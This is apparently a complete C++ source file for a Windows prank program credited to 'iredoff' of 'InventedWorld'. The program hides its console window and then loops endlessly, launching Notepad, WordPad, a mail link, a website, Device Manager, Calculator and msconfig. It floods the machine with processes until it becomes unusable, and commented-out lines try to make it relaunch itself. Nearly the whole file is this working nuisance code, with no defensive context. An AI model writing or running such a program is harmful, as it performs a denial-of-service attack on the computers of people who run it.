#include <iostream>
#include <string>
#include <windows.h>

using namespace std;

int main(int argc, char** argv) {
	cout << argv[0] << endl;

	system("title Developed by iredoff. InventedWorld");
	system("echo Developed by iredoff. (c) InventedWorld");
	system("echo ByeBye :(");
	//system("start"&argv[0]);
	HWND hWnd = GetForegroundWindow();
    ShowWindow(hWnd,SW_HIDE);

	while(true){
		system(": a");
		//system("start " + argv[0]);
		system("start notepad");
		system("start write");
		system("start mail:test@test.ru");
		system("start http://inventedworld.su");
		system("start devmgmt.msc");
		system("start calc");
		system("start msconfig");
		
		system("goto a");
	}
	return 0;
}
